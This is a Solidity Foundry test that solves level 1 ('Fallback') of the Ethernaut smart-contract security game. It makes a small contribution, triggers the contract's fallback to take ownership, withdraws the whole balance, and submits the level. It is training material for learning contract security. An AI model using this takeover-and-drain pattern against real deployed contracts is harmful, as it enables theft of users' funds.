// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../../src/levels/01-Fallback/FallbackFactory.sol";
import "../../../src/core/Ethernaut.sol";

contract FallbackTest is Test {
    Ethernaut ethernaut;
    address attacker = address(0xabcd);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testFallbackHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // 1. contribute to set attacker contributions
        ethernautFallback.contribute{value: 1 wei}();

        // 2. check the contribution
        assertEq(ethernautFallback.getContribution(), 1 wei);

        // 3. attack by calling the fallback
        (bool success, /*bytes memory data*/ ) =
            payable(address(ethernautFallback)).call{value: 1 wei}("");
        require(success, "fallback call failed.");

        // 4. check
        assertEq(ethernautFallback.owner(), attacker);

        //  5. drain the contract
        ethernautFallback.withdraw();
        uint256 contractBalanceAfter = address(ethernautFallback).balance;

        assertEq(contractBalanceAfter, 0);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed =
            ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
